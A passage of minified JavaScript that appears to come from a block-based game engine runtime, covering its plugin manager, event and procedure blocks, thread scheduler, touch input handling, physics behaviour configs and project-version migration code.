        key: "getSdkInstance",
        value: function () {
            return this._sdkInstance;
        }
    }, {
        key: "getRuntime",
        value: function () {
            return this._runtime;
        }
    }, {
        key: "getObjectClass",
        value: function () {
            return this._objectType;
        }
    }]), e;
}(), ObjectClass = function () {
    function n(t, e, i) {
        classCallCheck(this, n), this._runtime = t, this._plugin = t.getPluginManager().getPluginByConstructorFunction(e),
            this._instances = [], this._sdkType = null, this._instSdkCtor = e.Instance, this._name = i.name,
            this._plugin.isSingleGlobal() && (this._plugin.setSingleGlobalObjectClass(this),
                this._createSingleGlobalInstance());
    }
    return createClass(n, [{
        key: "getGlobalInstance",
        value: function () {
            return this._instances[0];
        }
    }, {
        key: "_createSingleGlobalInstance",
        value: function () {
            var t = this._runtime.getNextUid(), e = new Instance({
                runtime: this._runtime,
                objectType: this,
                uid: t
            });
            e.createSdkInstance(), this._runtime.mapInstanceByUID(t, e), this._instances.push(e);
        }
    }, {
        key: "createInstance",
        value: function (t, e, i) {
            var n = this._runtime.getNextUid();
            return (t = new Instance({
                runtime: this._runtime,
                objectType: this,
                uid: n,
                sprite: t
            })).createSdkInstance(getObjectValue(e), i), this._runtime.mapInstanceByUID(n, t),
                this._instances.push(t), t;
        }
    }, {
        key: "getName",
        value: function () {
            return this._name;
        }
    }, {
        key: "getPlugin",
        value: function () {
            return this._plugin;
        }
    }, {
        key: "getInstanceSdkCtor",
        value: function () {
            return this._instSdkCtor;
        }
    }, {
        key: "getSdkType",
        value: function () {
            return this._sdkType;
        }
    }]), n;
}(), PluginManager = function () {
    function e(t) {
        classCallCheck(this, e), this._runtime = t, this._allPlugins = [], this._pluginsByCtor = new Map(),
            this._systemPlugins = [], this._allBehaviors = [], this._behaviorsByCtor = new Map(),
            this._solidBehavior = null, this._jumpthruBehavior = null;
    }
    return createClass(e, [{
        key: "createPlugin",
        value: function (t) {
            var e = LB.Plugins[t.id];
            if (!e) throw new Error("missing plugin");
            (t = new e({
                runtime: this._runtime,
                isSingleGlobal: t.isGlobal || 0
            })).onCreate(), this._allPlugins.push(t), this._pluginsByCtor.set(e, t);
        }
    }, {
        key: "createSystemPlugin",
        value: function (t) {
            var e = LB.Plugins[t.id];
            if (!e) throw new Error("missing plugin");
            (t = new e({
                runtime: this._runtime,
                isSingleGlobal: t.isGlobal || 0
            })).onCreate(), this._allPlugins.push(t), this._systemPlugins.push(t), this._pluginsByCtor.set(e, t);
        }
    }, {
        key: "createBehavior",
        value: function (t) {
            if (!(t = LB.Behaviors[t])) throw new Error("missing behavior");
            var e = new t({
                runtime: this._runtime
            });
            e.onCreate(), this._allBehaviors.push(e), this._behaviorsByCtor.set(t, e);
        }
    }, {
        key: "getPluginByConstructorFunction",
        value: function (t) {
            return this._pluginsByCtor.get(t) || null;
        }
    }, {
        key: "hasBehaviorByConstructorFunction",
        value: function (t) {
            return this._behaviorsByCtor.has(t);
        }
    }, {
        key: "getBehaviorByConstructorFunction",
        value: function (t) {
            return this._behaviorsByCtor.get(t) || null;
        }
    }, {
        key: "getSystemPlugin",
        value: function () {
            return this._systemPlugins;
        }
    }, {
        key: "getSolidBehavior",
        value: function () {
            return this._solidBehavior;
        }
    }, {
        key: "getJumpthruBehavior",
        value: function () {
            return this._jumpthruBehavior;
        }
    }, {
        key: "reset",
        value: function () {
            this._allPlugins.forEach(function (t) {
                t.reset();
            });
        }
    }, {
        key: "release",
        value: function () {
            this._allBehaviors.forEach(function (t) {
                t.release();
            }), this._allPlugins.forEach(function (t) {
                t.release();
            }), this._allPlugins = null, this._pluginsByCtor = null, this._systemPlugins = null,
                this._allBehaviors = null, this._behaviorsByCtor = null, this._solidBehavior = null,
                this._jumpthruBehavior = null;
        }
    }]), e;
}(), EventBlocks = function () {
    function e(t) {
        classCallCheck(this, e), this.vm = t, this.renderer = t.renderer, this.eventEmitter = getEventEmitter();
    }
    return createClass(e, [{
        key: "map",
        value: function () {
            var t;
            return (t = {})[OPCODE.eventGameStart] = this.start, t[OPCODE.eventReceivedMsg] = this.start,
                t[OPCODE.eventSwitchScene] = this.start, t[OPCODE.eventSceneStart] = this.start,
                t[OPCODE.eventScreenSwip] = this.start, t[OPCODE.eventTouchingSprite] = this.touchingObject,
                t[OPCODE.eventTouchingScreen] = this.touchingScreen, t[OPCODE.eventWhen] = this.when,
                t[OPCODE.eventObjectTouchingObject] = this.objectTouchingObject, t[OPCODE.eventObjectIntersectObject] = this.objectIntersect,
                t[OPCODE.eventObjectMoveout] = this.objectMoveOut, t[OPCODE.eventStartAsClone] = this.start,
                t[OPCODE.eventSendMsg] = this.sendMsg, t[OPCODE.eventDeviceMotionChange] = this.deviceMotionChange,
                t[OPCODE.eventAdEnd] = this.AdEnd, t[OPCODE.eventAdError] = this.AdError, t[OPCODE.eventGameShow] = this.start,
                t[OPCODE.eventGameHide] = this.start, t[OPCODE.eventOpenProgramSuccess] = this.start,
                t[OPCODE.eventKeyboardConfirm] = this.keyboardConfirm, t[OPCODE.eventKeyboardComplete] = this.start,
                t[OPCODE.eventVideoEnded] = this.videoEnd, t;
        }
    }, {
        key: "hats",
        value: function () {
            var t = {};
            return t[OPCODE.eventGameStart] = {
                originalOnly: !0
            }, t[OPCODE.eventReceivedMsg] = this.start, t[OPCODE.eventSwitchScene] = {
                originalOnly: !0
            }, t[OPCODE.eventSceneStart] = {
                originalOnly: !0
            }, t[OPCODE.eventScreenSwip] = {
                originalOnly: !0
            }, t[OPCODE.eventTouchingSprite] = {
                edgeActivated: !0,
                fields: {
                    OPTION_LIST: "_press_"
                }
            }, t[OPCODE.eventTouchingScreen] = {
                edgeActivated: !0,
                fields: {
                    OPTION_LIST: "_press_"
                }
            }, t[OPCODE.eventWhen] = {
                edgeActivated: !0
            }, t[OPCODE.eventObjectTouchingObject] = {}, t[OPCODE.eventObjectIntersectObject] = {},
                t[OPCODE.eventObjectMoveout] = {}, t[OPCODE.eventStartAsClone] = {}, t[OPCODE.eventSendMsg] = {},
                t[OPCODE.eventDeviceMotionChange] = {}, t[OPCODE.eventAdEnd] = {}, t[OPCODE.eventAdError] = {},
                t[OPCODE.eventGameShow] = {}, t[OPCODE.eventGameHide] = {}, t[OPCODE.eventOpenProgramSuccess] = {},
                t[OPCODE.eventKeyboardConfirm] = {}, t[OPCODE.eventKeyboardComplete] = {}, t[OPCODE.eventVideoEnded] = {},
                t;
        }
    }, {
        key: "start",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "startClone",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "sendMsg",
        value: function (t, e) {
            var i = t.TARGET;
            if (e.scope[i] ? i = e.scope[i] : lists.includes(i) || (i = this.vm.runtimeData.getCloneListById(i)),
                !1 === i) return !1;
            this.eventEmitter.emit(OPCODE.eventReceivedMsg, {
                OPTION_LIST: t.OPTION_LIST
            }, i);
        }
    }, {
        key: "touchingObject",
        value: function (t, e) {
            if ("_press_" === t.OPTION_LIST) {
                if (this.renderer.getSpriteById(e.target.id).mouse_down) return e.startBranch(1, !1),
                    !0;
                e.stop();
            } else e.startBranch(1, !1);
        }
    }, {
        key: "touchingScreen",
        value: function (t, e) {
            if ("_press_" === t.OPTION_LIST) {
                if (this.vm.inputManager.isMouseDown) return e.startBranch(1, !1), !0;
                e.stop();
            } else e.startBranch(1, !1);
        }
    }, {
        key: "when",
        value: function (t, e) {
            if (toBoolean(t.CONDITION)) return e.startBranch(1, !1), !0;
            e.stop();
        }
    }, {
        key: "objectTouchingObject",
        value: function (t, e) {
            this.when({
                CONDITION: !0
            }, e);
        }
    }, {
        key: "objectMoveOut",
        value: function (t, e) {
            this.when({
                CONDITION: !0
            }, e);
        }
    }, {
        key: "objectIntersect",
        value: function (t, e) {
            this.when({
                CONDITION: !0
            }, e);
        }
    }, {
        key: "deviceMotionChange",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "AdEnd",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "AdError",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "keyboardConfirm",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }, {
        key: "videoEnd",
        value: function (t, e) {
            e.startBranch(1, !1);
        }
    }]), e;
}(), ProcedureBlocks = function () {
    function e(t) {
        classCallCheck(this, e), this.vm = t;
    }
    return createClass(e, [{
        key: "map",
        value: function () {
            var t;
            return (t = {})[OPCODE.pc] = this.call, t[OPCODE.pcr] = this.call, t[OPCODE.pr] = this.return,
                t[OPCODE.arsn] = this.argumentReporterStringNumber, t[OPCODE.arb] = this.argumentReporterBoolean,
                t.procedures_definition = this.definition, t;
        }
    }, {
        key: "definition",
        value: function () { }
    }, {
        key: "return",
        value: function (t, e) {
            e.return(t.RETURN);
        }
    }, {
        key: "call",
        value: function (t, e) {
            var i = e.peekStackFrame();
            if (!i.executed) {
                var n = (s = t.mutation).definition, s = s.proccode;
                if (e.blocks.getBlock(n) || this.vm.runtimeData.mergeFunc(e.target, n), null !== (r = e.blocks.getProcedureParamNamesIdsAndDefaults(n))) {
                    var r, a = (r = slicedToArray(r, 3))[0], o = r[1], l = r[2];
                    i.params || (i.params = {});
                    for (var h = 0; h < o.length; h++) t.hasOwnProperty(o[h]) ? i.params[a[h]] = t[o[h]] : i.params[a[h]] = l[h];
                    if (i.executed = !0, e.isRecursiveCall(s)) throw new CallBlockException(e.target.id, "函数", "存在递归调用，调用栈溢出");
                    e.pushStack(n), e.startBranch(1, !1, {
                        isFunction: !0
                    });
                }
            }
        }
    }, {
        key: "argumentReporterStringNumber",
        value: function (t, e) {
            return null === (e = e.getParam(t.VALUE)) ? 0 : e;
        }
    }, {
        key: "argumentReporterBoolean",
        value: function (t, e) {
            return null === (e = e.getParam(t.VALUE)) ? 0 : e;
        }
    }]), e;
}(), blockFuncionsContainer = {
    event: EventBlocks,
    procedure: ProcedureBlocks
}, Action = function () {
    function s(t, e, i, n) {
        classCallCheck(this, s), this._pluginId = t, this._eventManager = e, this._runtime = e.getRuntime(),
            this._fun = i.fun, this._args = i.args || [], this._type = n.type, this._actionType = n.item;
    }
    return createClass(s, [{
        key: "isSystemPluginAction",
        value: function () {
            return 1 === this._type;
        }
    }, {
        key: "isUIPluginAction",
        value: function () {
            return 2 === this._type;
        }
    }, {
        key: "runGlobalAction",
        value: function (t) {
            var e = this._runtime._objectClassesByName.get(this._pluginId.toLowerCase());
            if (!e) throw _pluginId + "class不存在";
            if (e = e.getGlobalInstance().getSdkInstance()) return t = this._tansformParams(t),
                this._fun.apply(e, t);
            throw _pluginId + "插件实例对象不存在";
        }
    }, {
        key: "runBehavior",
        value: function (t, e) {
            return e = this._tansformParams(e), this._fun.apply(t, e);
        }
    }, {
        key: "runUIPluginAction",
        value: function (t, e) {
            for (var i = null, n = this._tansformParams(e), s = !0, r = 0; r < this._args.length; r++) if (this._args[r].isTarget) {
                var s = !1, a = e[this._args[r].name];
                "_self_" === a && (a = t.target.id), (a = this._runtime.runtimeData.getSpriteById(a)) && (i = a.getSdkInstance());
                break;
            }
            if (i = s ? t.target.getSdkInstance() : i) return this._fun.apply(i, n);
            throw "can't find Expression Context Targe";
        }
    }, {
        key: "runUIPluginExpressionAndCondition",
        value: function (t, e) {
            for (var i = null, n = this._tansformParams(e), s = 0; s < this._args.length; s++) if (this._args[s].isTarget) {
                var r = e[this._args[s].name];
                "_self_" === r && (r = t.target.id), (r = this._runtime.runtimeData.getSpriteById(r)) && (i = r.getSdkInstance());
                break;
            }
            if (i) return this._fun.apply(i, n);
            throw "can't find Expression Context Targe";
        }
    }, {
        key: "_tansformParams",
        value: function () {
            var e = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}, i = [];
            return this._args.forEach(function (t) {
                i.push(e[t.name]);
            }), i;
        }
    }]), s;
}(), EventBlockManager = function () {
    function e(t) {
        classCallCheck(this, e), this._runtime = t, this.threads = [], this._threadIndex = 0,
            this._currentThread = null, this.pause = !1, this.hats = Object.create(null), this.device = Object.create(null),
            this.edgeHats = [], this.blockFuncions = Object.create(null), this._actions = {};
    }
    return createClass(e, [{
        key: "release",
        value: function () {
            this.stopAllThread(), this._runtime = null, this._threadIndex = 0, this.threads = null,
                this.hats = null, this.edgeHats = null, this.blockFunctions = null, this.device = null,
                this._actions = null;
        }
    }, {
        key: "getRuntime",
        value: function () {
            return this._runtime;
        }
    }, {
        key: "registerHats",
        value: function () {
            var t = new blockFuncionsContainer.event(this);
            if (t.hats) for (var e = t.hats(), i = Object.keys(e), n = 0; n < i.length; n++) {
                var s = e[i[n]];
                (this.hats[i[n]] = s).edgeActivated && this.edgeHats.push({
                    opcode: i[n],
                    fields: s.fields
                });
            }
        }
    }, {
        key: "registerBlockFunctions",
        value: function () {
            for (var t = Object.keys(blockFuncionsContainer), e = 0; e < t.length; e++) {
                var i = new blockFuncionsContainer[t[e]](this._runtime);
                if (i.map) for (var n = i.map(), s = Object.keys(n), r = 0; r < s.length; r++) this.blockFuncions[s[r]] = n[s[r]].bind(i);
            }
        }
    }, {
        key: "registerActions",
        value: function () {
            var o = this;
            ["Behaviors", "Plugins"].forEach(function (r) {
                for (var a in LB[r]) !function () {
                    var t, n = LB[r][a], s = !(o._actions[a] = {});
                    "Plugins" === r && (t = o._runtime.getPluginManager().getPluginByConstructorFunction(n),
                        s = t && t.isSingleGlobal()), ["Action", "Condition", "Expression"].forEach(function (t) {
                            for (var e in n[t]) {
                                var i = "Plugins" === r ? s ? 1 : 2 : 0;
                                o._actions[a][e] = new Action(a, o, n[t][e], {
                                    type: i,
                                    item: t
                                });
                            }
                        });
                }();
            });
        }
    }, {
        key: "isExistPluginAction",
        value: function (t, e) {
            return !(!this._actions[t] || !this._actions[t][e]);
        }
    }, {
        key: "activeNewThread",
        value: function () {
            this.threads = this.threads.filter(function (t) {
                return t.status !== Thread.STATUS_DONE;
            });
            for (var t = 0; t < this.edgeHats.length; t++) {
                var e = (i = this.edgeHats[t]).opcode, i = (void 0 === (i = i.fields) ? {} : i).OPTION_LIST;
                this._runtime.eventEmitter.emit("" + e + (void 0 === i ? "" : i));
            }
        }
    }, {
        key: "traverseThreads",
        value: function () {
            if (!this.pause) for (this._threadIndex = 0; this._threadIndex < this.threads.length; this._threadIndex++) {
                var t = this.threads[this._threadIndex];
                t.target.isDeleted && t.stop(), 0 === t.stack.length ? t.status = Thread.STATUS_DONE : t.status !== Thread.STATUS_WAIT && (this.executeThread(t),
                    this._lastThreadScene = t._sceneId);
            }
        }
    }, {
        key: "getAction",
        value: function (t, e) {
            return this._actions[t] && this._actions[t][e];
        }
    }, {
        key: "executeThread",
        value: function (t) {
            var e = t.peekStack();
            for (this._currentThread = t; e;) {
                if (this.doAction(t), t.status === Thread.STATUS_YIELD) return void (t.status = Thread.STATUS_RUNNING);
                if (t.status === Thread.STATUS_DONE) return;
                if (t.status === Thread.STATUS_WAIT) return;
                for (t.peekStack() !== e && t.blocks.map[e].opcode !== OLDCODE_TRANSFORM_NEWCODE.lb && t.blocks.map[e].opcode !== OLDCODE_TRANSFORM_NEWCODE.lbll || t.goToNextBlock(); null === t.peekStack();) {
                    if (t.popStack(), 0 === t.stack.length) return void (t.status = Thread.STATUS_DONE);
                    var i = t.peekStackFrame();
                    if (i.isLoop) return;
                    i.isLogicLoop || t.goToNextBlock();
                }
                e = t.peekStack();
            }
        }
    }, {
        key: "setIfElseBranch",
        value: function (t, e, i) {
            if (!t.startBranch(e ? 1 : 2, !1, i)) for (t.goToNextBlock(); null === t.peekStack();) {
                if (t.popStack(), 0 === t.stack.length) return void (t.status = Thread.STATUS_DONE);
                var n = t.peekStackFrame();
                if (n.isLoop) return;
                n.isLogicLoop || t.goToNextBlock();
            }
        }
    }, {
        key: "doAction",
        value: function (t) {
            var e = t.peekStack();
            if ((e = t.target.blocks.getCache(e, this._runtime)) || void 0 === e || 0 === e) for (var i = e._ops, n = 0; n < i.length; n++) {
                if (t.target.isDeleted) return void t.stop();
                var s = i[n], r = s._blockFunction, a = s._argValues, o = s.id, l = s._isPluginAction, h = void 0;
                if (r) try {
                    h = r(a, t);
                } catch (e) {
                    this._throwErrorTip(e, t, o);
                } else if (l) try {
                    var u = this.getAction(s._pluginName, s._pluginMethod);
                    if (u) {
                        var c = u.isSystemPluginAction(), p = u.isUIPluginAction();
                        if (c) h = u.runGlobalAction(a); else if (p) h = "Action" === u._actionType ? u.runUIPluginAction(t, a) : u.runUIPluginExpressionAndCondition(t, a); else try {
                            h = u.runBehavior(t.target._behaviorInst[s._pluginName], a);
                        } catch (e) {
                            console.error(e), this._throwErrorTip(new CallBlockException(t.target.id, t.target.name, "相关行为不存在，请在资源面板选择并添加行为"), t, o);
                        }
                    }
                } catch (e) {
                    console.error(e), (r = e.msg) || "string" != typeof e || (r = e), this._throwErrorTip(new CallBlockException(t.target.id, t.target.name, r || "积木执行报错，请检查积木是否正常"), t, o);
                }
                if (t.status === Thread.STATUS_RUNNING) {
                    if (n === i.length - 1) return;
                    l = s._parentKey, a = s._parentValues, "BROADCAST_INPUT" === l ? (a.BROADCAST_OPTION.id = null,
                        a.BROADCAST_OPTION.name = String(h)) : a[l] = h;
                }
            } else t.stop();
        }
    }, {
        key: "_throwErrorTip",
        value: function (t, e, i) {
            if (t instanceof CallBlockException) {
                for (var n = !1, s = e.stack, r = e.stackFrames, a = r.length - 1; 0 <= a; a--) if (r[a].isFunction) {
                    n = !0, window.focusProcedure && window.focusProcedure(s[a], !0);
                    break;
                }
                this.stopAllThread(), window.focusBlock && window.focusBlock({
                    spriteID: !n && e.target.origin,
                    layerID: e.target.id,
                    blockID: i,
                    sceneID: e._sceneId,
                    type: 1
                }), window.showError && window.showError("精灵「" + t.name + "」: " + t.msg + "！(积木已高亮)", "我知道了");
            } else if (t instanceof SpriteMissing) console.error("can't find sprite", t.id, t.name); else {
                if (!(t instanceof SceneConfigMissing)) throw this.stopAllThread(), t;
                console.error("can't find scene", t.id);
            }
        }
    }, {
        key: "runPluginAction",
        value: function (t, e, i) {
            var n, s, r = this.getAction(e._pluginName, e._pluginMethod);
            if (r) return n = r.isSystemPluginAction(), s = r.isUIPluginAction(), n ? r.runGlobalAction(i) : s ? "Action" === r._actionType ? r.runUIPluginAction(t.target.getSdkInstance(), i) : r.runUIPluginExpressionAndCondition(t, i) : r.runBehavior(t.target._behaviorInst[e._pluginName], i);
            throw "未知插件积木";
        }
    }, {
        key: "runThreadStatus",
        value: function () {
            this.pause = !1;
        }
    }, {
        key: "pauseAllThread",
        value: function (t) {
            this.pause = !!t, this._runtime.renderer.soundManager && (this.pause ? this._runtime.renderer.soundManager.pauseAll() : this._runtime.renderer.soundManager.resumeBgmByShow());
        }
    }, {
        key: "stopAllThread",
        value: function () {
            var t = this._runtime.runtimeData, e = t.scenes;
            (e = void 0 === e ? {} : e)[t = t.current_scene_id] && e[t].sprites.forEach(function (t) {
                t && t.animationId && (window.cancelAnimationFrame(t.animationId), t.animationId = null);
            }), this.threads.forEach(function (t) {
                return t.stop();
            }), this._threadIndex = 0, this.threads = [], Performance.print(), Performance.clear();
        }
    }, {
        key: "stopOtherTargetThreads",
        value: function (t) {
            for (var e = t.target, i = 0; i < this.threads.length; i++) this.threads[i] !== t && this.threads[i].target === e && this.threads[i].stop();
        }
    }, {
        key: "currentThread",
        get: function () {
            return this._currentThread;
        }
    }]), e;
}(), GlobalEvent = function (t, e) {
    this.target = t, this.data = e;
}, wipeListener = void 0, InputManager = function () {
    function e(t) {
        classCallCheck(this, e), this.app = t, this.eventEmitter = getEventEmitter(), this.stageHammer = new Hammer__namespace.Manager(t.view, {
            recognizers: [[Hammer__namespace.Swipe, {
                direction: Hammer__namespace.DIRECTION_ALL
            }]]
        }), this.mouse_x = NaN, this.mouse_y = NaN, this.mouse_down = !1, this.isMouseMoving = !1,
            this.bindStageEvent(), this.bindMouseEvent();
    }
    return createClass(e, [{
        key: "bindStageEvent",
        value: function () {
            this.app.stage.on("pointerdown", this.pointerDown.bind(this)), this.app.stage.on("pointermove", this.pointerMove.bind(this)),
                this.app.stage.on("pointerup", this.pointerUp.bind(this)), this.app.stage.on("pointerupoutside", this.pointerUpOutside.bind(this)),
                this.app.stage.on("pointerout", this.pointerout.bind(this));
        }
    }, {
        key: "release",
        value: function () {
            this.cancelMouseEvent(), this.app.stage.removeAllListeners();
        }
    }, {
        key: "bindMouseEvent",
        value: function () {
            var e = this;
            wipeListener = function (t) {
                e.onSwipe(t);
            }, this.stageHammer.on("swipe", wipeListener);
        }
    }, {
        key: "cancelMouseEvent",
        value: function () {
            this.stageHammer.off("swipe", wipeListener), wipeListener = null;
        }
    }, {
        key: "pointerDown",
        value: function (t) {
            var e, i;
            this.app.penetration || (this.mouse_down = !0, this.mouse_down_time = Date.now(),
                i = (e = t.data.getLocalPosition(this.app.stage)).x, e = e.y, this.mouse_x = i,
                this.mouse_y = e, i = new GlobalEvent(this, t), this.eventEmitter.emit(VMEventType.pointerdown, Config.isCodeMode ? i : t),
                this.eventEmitter.emit(VMEventType.start, Config.isCodeMode ? i : void 0));
        }
    }, {
        key: "pointerUp",
        value: function (t) {
            var e, i;
            this.app.penetration || (this.mouse_diff_x = 0, this.mouse_diff_y = 0, this.mouse_down = !1,
                i = (e = t.data.getLocalPosition(this.app.stage)).x, e = e.y, this.mouse_x = i,
                this.mouse_y = e, i = new GlobalEvent(this, t), this.eventEmitter.emit(VMEventType.pointerup, Config.isCodeMode ? i : t),
                this.eventEmitter.emit(VMEventType.loose, Config.isCodeMode ? i : t), 10 < Date.now() - this.mouse_down_time && Date.now() - this.mouse_down_time < 500 && (this.eventEmitter.emit(VMEventType.click, Config.isCodeMode ? i : void 0),
                    this.__firstUptime && Date.now() - this.__firstUptime < 300 ? (this.__firstUptime = null,
                        this.eventEmitter.emit(VMEventType.dblclick, Config.isCodeMode ? i : t)) : this.__firstUptime = Date.now()));
        }
    }, {
        key: "pointerMove",
        value: function (t) {
            var e;
            this.penetration || (this.isMouseMoving = !0, e = t.data.getLocalPosition(this.app.stage),
                this.mouse_diff_x = e.x - this.mouse_x, this.mouse_diff_y = e.y - this.mouse_y,
                this.mouse_x = e.x, this.mouse_y = e.y, this.eventEmitter.emit(VMEventType.pointermove, Config.isCodeMode ? new GlobalEvent(this, t) : void 0));
        }
    }, {
        key: "pointerout",
        value: function (t) {
            this.app.penetration || (this.mouse_diff_x = 0, this.mouse_diff_y = 0, this.mouse_down = !1);
        }
    }, {
        key: "pointerUpOutside",
        value: function (t) {
            var e;
            this.app.penetration || (this.mouse_diff_x = 0, this.mouse_diff_y = 0, this.mouse_down = !1,
                e = t.data.getLocalPosition(this.app.stage), this.mouse_x = e.x, this.mouse_y = e.y,
                e = new GlobalEvent(this, t), this.eventEmitter.emit(VMEventType.pointerupoutside, Config.isCodeMode ? e : t),
                this.eventEmitter.emit(VMEventType.pointerup, Config.isCodeMode ? e : t), this.eventEmitter.emit(VMEventType.loose, Config.isCodeMode ? e : t));
        }
    }, {
        key: "onSwipe",
        value: function (t) {
            if (!this.app.penetration) switch (t.direction) {
                case Hammer__namespace.DIRECTION_DOWN:
                    this.eventEmitter.emit(VMEventType.stageSwipe, {
                        OPTION_LIST: "_down_"
                    });
                    break;

                case Hammer__namespace.DIRECTION_UP:
                    this.eventEmitter.emit(VMEventType.stageSwipe, {
                        OPTION_LIST: "_up_"
                    });
                    break;

                case Hammer__namespace.DIRECTION_LEFT:
                    this.eventEmitter.emit(VMEventType.stageSwipe, {
                        OPTION_LIST: "_left_"
                    });
                    break;

                case Hammer__namespace.DIRECTION_RIGHT:
                    this.eventEmitter.emit(VMEventType.stageSwipe, {
                        OPTION_LIST: "_right_"
                    });
            }
        }
    }, {
        key: "mouseX",
        get: function () {
            return parseFloat(this.mouse_x.toFixed(2));
        }
    }, {
        key: "mouseY",
        get: function () {
            return parseFloat((-this.mouse_y).toFixed(2));
        }
    }, {
        key: "isMouseDown",
        get: function () {
            return this.mouse_down;
        }
    }, {
        key: "mouseMoveDiffX",
        get: function () {
            return this.isMouseMoving ? parseFloat(this.mouse_diff_x) : 0;
        }
    }, {
        key: "mouseMoveDiffY",
        get: function () {
            return this.isMouseMoving ? parseFloat(-this.mouse_diff_y) : 0;
        }
    }]), e;
}(), defaultConfig = {
    id: "Physical",
    type: "behavior",
    name: "物理",
    desc: "让精灵具有物理行为",
    author: "",
    version: 1,
    properties: {
        enable: {
            name: "Enable",
            type: "boolean",
            value: !1
        },
        canRotation: {
            name: "能否倾倒",
            type: "boolean",
            value: !0
        },
        friction: {
            name: "摩擦系数",
            type: "number",
            value: .1
        },
        linearDamping: {
            name: "表面摩擦系数",
            type: "number",
            value: 0
        },
        angularDamping: {
            name: "旋转摩擦系数",
            type: "number",
            value: 0
        },
        rebound: {
            name: "反弹系数",
            type: "number",
            value: 0
        },
        speed: {
            name: "速度大小",
            type: "number",
            value: 0
        },
        speedDirection: {
            name: "速度方向",
            type: "number",
            value: 0
        },
        force: {
            name: "力的大小",
            type: "number",
            value: 0
        },
        forceDirection: {
            name: "力的方向",
            type: "number",
            value: 0
        },
        type: {
            name: "类型",
            type: "select",
            options: [["动态刚体", "false"], ["静态刚体", "true"]],
            value: "false"
        },
        precision: {
            name: "精灵轮廓",
            type: "select",
            options: [["素材轮廓", "true"], ["矩形", "rect"], ["圆形", "circle"]],
            value: "true"
        }
    },
    category: "behavior",
    visible: !0
}, BounceofConfig = {
    id: "Bounceof",
    type: "behavior",
    name: "反弹",
    desc: "让精灵具备反弹的行为",
    author: "",
    version: 1,
    properties: {
        enable: {
            name: "Enable",
            type: "boolean",
            value: !0
        },
        speed: {
            name: "运动速度",
            type: "number",
            value: 0
        },
        towardsRotation: {
            name: "运动朝向",
            type: "number",
            value: 0
        }
    },
    visible: !0,
    category: "behavior"
}, fieldNeedTranslate = [OLDCODE_TRANSFORM_NEWCODE.mm, OLDCODE_TRANSFORM_NEWCODE.mt, OLDCODE_TRANSFORM_NEWCODE.mto, OLDCODE_TRANSFORM_NEWCODE.mg, OLDCODE_TRANSFORM_NEWCODE.mr, OLDCODE_TRANSFORM_NEWCODE.mro, OLDCODE_TRANSFORM_NEWCODE.mtu, OLDCODE_TRANSFORM_NEWCODE.mgo, OLDCODE_TRANSFORM_NEWCODE.ms, OLDCODE_TRANSFORM_NEWCODE.mc, OLDCODE_TRANSFORM_NEWCODE.mse, OLDCODE_TRANSFORM_NEWCODE.ls, OLDCODE_TRANSFORM_NEWCODE.lh, OLDCODE_TRANSFORM_NEWCODE.lswi, OLDCODE_TRANSFORM_NEWCODE.lsw, OLDCODE_TRANSFORM_NEWCODE.lsss, OLDCODE_TRANSFORM_NEWCODE.lse, OLDCODE_TRANSFORM_NEWCODE.lc, OLDCODE_TRANSFORM_NEWCODE.lset, OLDCODE_TRANSFORM_NEWCODE.lca, OLDCODE_TRANSFORM_NEWCODE.lssf, OLDCODE_TRANSFORM_NEWCODE.lscr, OLDCODE_TRANSFORM_NEWCODE.lscb, OLDCODE_TRANSFORM_NEWCODE.ln, OLDCODE_TRANSFORM_NEWCODE.af, OLDCODE_TRANSFORM_NEWCODE.as, OLDCODE_TRANSFORM_NEWCODE.afo, OLDCODE_TRANSFORM_NEWCODE.afi, OLDCODE_TRANSFORM_NEWCODE.ag, OLDCODE_TRANSFORM_NEWCODE.agp, OLDCODE_TRANSFORM_NEWCODE.csd, OLDCODE_TRANSFORM_NEWCODE.cj], PhysicalPropertyMap = {
    _rebound_: {
        value: "Physical-rebound",
        name: "反弹系数"
    },
    _friction_: {
        value: "Physical-friction",
        name: "摩擦系数"
    },
    _speed_x_: {
        value: "Physical-speedX",
        name: "水平速度"
    },
    _speed_y_: {
        value: "Physical-speedY",
        name: "垂直速度"
    },
    _quality_: {
        value: "Physical-quality",
        name: "质量"
    }
};

function tranformCode(t) {
    if (!t.version || t.version <= 13) {
        var e, i = 0, n = 0, s = 0, r = t.components;
        for (m in r) {
            var a, o = r[m];
            for (a in o.layers || (o.layers = []), o.blocks) {
                var l, h = o.blocks[a];
                h.opcode === OLDCODE_TRANSFORM_NEWCODE.sgbp && (l = h.fields.OPTION_LIST2, h.fields.OPTION_LIST2 = {
                    name: "OPTION_LIST2",
                    value: "Physical",
                    text: "物理"
                }, h.fields.OPTION_LIST3 = {
                    name: "OPTION_LIST3",
                    value: PhysicalPropertyMap[l.value].value,
                    text: PhysicalPropertyMap[l.value].name
                }), o.plugins || (o.plugins = []), /physical/i.test(h.opcode) && !hasKey(o.plugins, "Physical") ? (i++,
                    o.plugins.push(defaultConfig)) : /bounceOf/i.test(h.opcode) && !hasKey(o.plugins, "Bounceof") ? (n++,
                        o.plugins.push(BounceofConfig)) : !s && -1 < h.opcode.indexOf("LocalStorage") && (s = 1),
                    -1 < fieldNeedTranslate.indexOf(h.opcode) && void 0 === h.fields.OPTION_LIST1 && (h.fields.OPTION_LIST1 = {
                        name: "OPTION_LIST1",
                        value: "_self_"
                    });
            }
        }
        for (e in t.behaviors.Physical || t.behaviors.Bounceof || (t.behaviors = {}), i && (t.behaviors ? t.behaviors.Physical = i : t.behaviors = {
            Physical: i
        }), n && (t.behaviors ? t.behaviors.Bounceof = n : t.behaviors = {
            Bounceof: n
        }), s && (t.plugins = [{
            id: "LocalStorage",
            type: "data",
            name: "本地缓存",
            desc: "将数据存储在本地缓存中指定的 key 中",
            author: "",
            version: 1,
            isGlobal: 1,
            color: "cyanogen",
            category: "plugin"
        }]), t.sprites) {
            var u = t.sprites[e].origin;
            t.components[u].layers.push(e);
        }
    }
    if (!t.version || t.version <= 14) {
        var c = 0, p = t.components;
        for (m in p) {
            var d = p[m];
            "background" === d.type && 0 < d.scripts.length && (d.properties.adaptationMode = 3,
                d.plugins || (d.plugins = []), d.plugins.findIndex(function (t) {
